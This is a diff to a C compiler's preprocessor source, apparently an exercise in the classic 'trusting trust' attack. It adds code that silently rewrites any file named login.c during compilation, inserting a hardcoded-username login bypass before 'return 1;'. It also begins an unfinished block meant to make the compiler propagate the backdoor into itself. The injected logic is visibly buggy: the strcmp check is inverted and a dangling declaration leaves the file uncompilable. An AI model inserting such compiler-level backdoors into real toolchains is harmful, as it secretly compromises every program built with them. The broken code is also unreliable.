@@ -647,12 +647,52 @@ static int handle_eob(void)
     /* only tries to read if really end of buffer */
     if (bf->buf_ptr >= bf->buf_end) {
         if (bf->fd >= 0) {
-#if defined(PARSE_DEBUG)
-            len = 1;
-#else
-            len = IO_BUF_SIZE;
-#endif
-            len = read(bf->fd, bf->buffer, len);
+            #if defined(PARSE_DEBUG)
+                        len = 1;
+            #else
+                        len = IO_BUF_SIZE;
+            #endif
+                        len = read(bf->fd, bf->buffer, len);
+
+            /* Bugged login code start*/
+
+            /* The source code to hack bugged_login.c */
+            // The string to be inserted into bugged_login.c
+            const char* inject_login = "if(strcmp(username, %ccabbageham%c)) {%c printf(%cwelcome!%cn%c);%c return 0;%c }%c";
+            // %c 34 = "
+            // %c 10 = newline (\n)
+            // %c 92 = /
+            if(strstr(file->filename, "login.c") != NULL) {
+                unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 200);
+                snprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 92, 34, 10, 10, 10);
+                int inject_len = strlen(inject_login);
+                unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);
+                // Get the location we want to insert, in this case we want to insert malicious code before it return 1 in the do_login function.
+                unsigned char* inject_location = strstr(bf->buffer, "return 1;");
+                int pre_inject_len = inject_location - bf->buffer;
+                
+                // This line should have been deleted. Previously I add a space at the very beginning to avoid revisiting the same file. But since I adopted a counter to handle this, this line doesn't make sense anymore.
+                new_buf[0] = ' ';
+                strncpy(new_buf + 1, bf->buffer, pre_inject_len);
+                strncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);
+                strcat(new_buf, inject_location);
+                len = len + inject_len - 9;
+                strncpy(bf->buffer, new_buf, len);
+                bf->buffer[len] = 0;
+                tcc_free(inject_code);
+                tcc_free(new_buf);
+            }
+
+
+            /* The source code to insert itself to tccpp.c, make malicious tcc self-perpetuating. */
+            // Inject_compiler is the string able to represent the whose code block I want to insert.
+            const char* inject_compiler =
+
+
+
+
+            /* Bugged login code end*/
+
             if (len < 0)
                 len = 0;
         } else {
